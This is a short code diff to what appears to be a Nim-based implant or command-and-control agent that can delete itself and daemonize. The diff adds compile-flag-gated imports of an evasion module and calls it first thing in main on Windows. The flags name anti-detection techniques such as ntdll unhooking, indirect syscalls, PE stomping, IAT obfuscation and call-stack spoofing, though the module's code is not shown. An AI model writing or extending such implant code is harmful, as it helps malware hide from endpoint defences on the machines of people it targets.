@@ -18,6 +18,10 @@ else:
       import utils/self_delete
     import winim/lean
 
+    # Evasion imports
+    when defined(evasion_nocrt) or defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_stomp_pe) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+      import utils/evasion
+
   when defined(linux):
     import posix
 
@@ -51,6 +55,11 @@ else:
 
   # Main entry point
   proc main() =
+    # Run evasion techniques as early as possible
+    when defined(windows):
+      when defined(evasion_nocrt) or defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_stomp_pe) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+        runEvasionInit()
+
     # Daemonize if compile flag is set
     when defined(daemonize):
       if daemonize():
